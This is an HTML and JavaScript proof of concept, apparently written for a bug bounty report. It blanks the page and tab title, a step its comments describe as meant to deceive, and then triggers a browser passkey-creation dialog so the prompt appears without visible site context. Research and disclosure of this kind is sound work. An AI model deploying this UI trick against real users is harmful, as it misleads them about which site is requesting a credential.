<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Passkey UI Bug Bounty PoC - Blank Redirect</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; transition: opacity 0.2s; }
        button { padding: 15px 25px; font-size: 16px; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 5px; }
        #log { margin-top: 20px; color: #333; font-family: monospace; white-space: pre-wrap; text-align: left; background: #f4f4f4; padding: 10px; border-radius: 5px; }
        
        /* CSS untuk efek blank screen */
        .blank-screen {
            background-color: #ffffff !important; /* Warna putih */
            color: #ffffff !important; /* Sembunyikan teks */
            overflow: hidden;
        }
        .hide-content { display: none !important; }
    </style>
</head>
<body>

    <div id="main-content">
        <h2>Uji Coba Dialog Passkey</h2>
        <p>Klik tombol di bawah ini. Layar akan menjadi blank sejenak, lalu popup Passkey akan muncul.</p>
        <button id="registerBtn">Buat Passkey (Trigger Dialog)</button>
        <div id="log">Menunggu interaksi...</div>
    </div>

    <script>
        const btn = document.getElementById('registerBtn');
        const logDiv = document.getElementById('log');
        const mainContent = document.getElementById('main-content');

        btn.addEventListener('click', async () => {
            // --- TRIK 1: MEMBUAT LAYAR BLANK ---
            // Sembunyikan semua konten HTML agar layar terlihat kosong
            mainContent.classList.add('hide-content');
            document.body.classList.add('blank-screen');

            // Opsional: Ubah judul tab menjadi kosong untuk mengecoh
            document.title = " ";

            // Beri jeda sedikit (misal 100ms) agar browser sempat merender layar blank
            // sebelum popup sistem muncul
            setTimeout(async () => {
                
                const publicKeyCredentialCreationOptions = {
                    challenge: Uint8Array.from("random_challenge_string_12345", c => c.charCodeAt(0)),
                    rp: {
                        name: "PoC Bug Bounty",
                        // JANGAN isi id jika ingin menggunakan domain saat ini
                    },
                    user: {
                        id: Uint8Array.from("user_id_123", c => c.charCodeAt(0)),
                        name: "test@example.com",
                        displayName: "Test User"
                    },
                    pubKeyCredParams: [
                        { alg: -7, type: "public-key" }, 
                        { alg: -257, type: "public-key" }
                    ],
                    authenticatorSelection: {
                        authenticatorAttachment: "platform",
                        userVerification: "required",
                        residentKey: "required"
                    },
                    timeout: 60000,
                    attestation: "none"
                };

                try {
                    // --- TRIK 2: TRIGGER POPUP SAAT LAYAR BLANK ---
                    const credential = await navigator.credentials.create({
                        publicKey: publicKeyCredentialCreationOptions
                    });
                    
                    // Jika sukses, kembalikan layar (opsional)
                    document.body.classList.remove('blank-screen');
                    mainContent.classList.remove('hide-content');
                    logDiv.innerText = "Sukses! Passkey berhasil dibuat.";
                    
                } catch (err) {
                    // Jika error/batal, kembalikan layar
                    document.body.classList.remove('blank-screen');
                    mainContent.classList.remove('hide-content');
                    logDiv.innerText = "Error atau Dibatalkan: " + err.name + " - " + err.message;
                }
            }, 100); // Jeda 100 milidetik
        });
    </script>
</body>
</html>
